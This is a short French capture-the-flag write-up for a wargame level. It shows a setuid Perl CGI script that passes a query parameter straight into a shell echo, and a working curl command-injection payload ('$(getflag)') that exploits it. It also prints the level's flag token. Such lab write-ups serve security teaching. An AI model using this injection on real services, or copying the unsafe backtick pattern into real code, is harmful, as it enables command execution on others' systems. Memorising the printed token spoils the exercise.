
# **Level 04**

Pour ce level04, nous avons un executable `perl` dans le dossier courant appartenant a flag04 et que l'on peux executer avec les droits de flag04 -rw`s`r-`s`-r-x 

>(le `s` signifiant de l'executer avec les droits du owner du fichier)

```
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Lorsque l'on affiche le fichier on a cette output:

```
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

```

On comprend qu'il y a un server qui tourne sur `localhost:4747` et qui prend un query parameter `x` en entree et l'affiche.

```
level04@SnowCrash:~$ curl localhost:4747?x=salut
salut
```
comme la commande echo est lance, elle peux prendre en parametre la sorti d'un `subshell` dans lequel on executerai `getflag`

```
level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

> ### NEXT : [Level 05](/level05/resources/README.md)
